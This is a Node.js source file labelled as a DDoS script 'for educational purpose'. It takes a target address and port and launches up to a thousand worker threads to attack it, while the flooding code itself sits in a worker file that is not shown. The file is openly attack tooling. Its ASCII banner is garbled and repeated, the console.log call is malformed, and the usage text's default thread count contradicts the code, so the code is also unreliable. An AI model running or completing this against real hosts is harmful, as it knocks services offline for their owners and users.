const { Worker } = require('worker_threads');

console.log

██║░░░░░██╔══╝░░██╔══██║██╔══██╗░██╔██╗░██║░░██║
            ███████╗███████╗██║░░██║██║░░██║██╔╝╚██╗██████╔╝
            ╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░ ██║░░░░░██╔══╝░░██╔══██║██╔══██╗░██╔██╗░██║░░██║
            ███████╗███████╗██║░░██║██║░░██║██╔╝╚██╗██████╔╝
            ╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░ ██║░░░░░██╔══╝░░██╔══██║██╔══██╗░██╔██╗░██║░░██║
            ███████╗███████╗██║░░██║██║░░██║██╔╝╚██╗██████╔╝
            ╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░
            
                  DDOS Script for Educational Purpose
`)

const [node, dir, address, port, threads = 1000, time = 5000] = process.argv;

if (!address || !port) {
  return console.log('[ERROR] Use: \'node . <address> <port> [<threads> (default 4)] [<time> (in minutes)]\'')
}

for (let i = 0; i < threads; i++) {
  console.log(`[DDOS] Starting thread #${i}...`)

  const worker = new Worker('./worker.js');
  worker.postMessage({
    address,
    port,
    time,
    thread: 100000000000
  });
}

console.log("[DDOS] Starting in 3 seconds...")
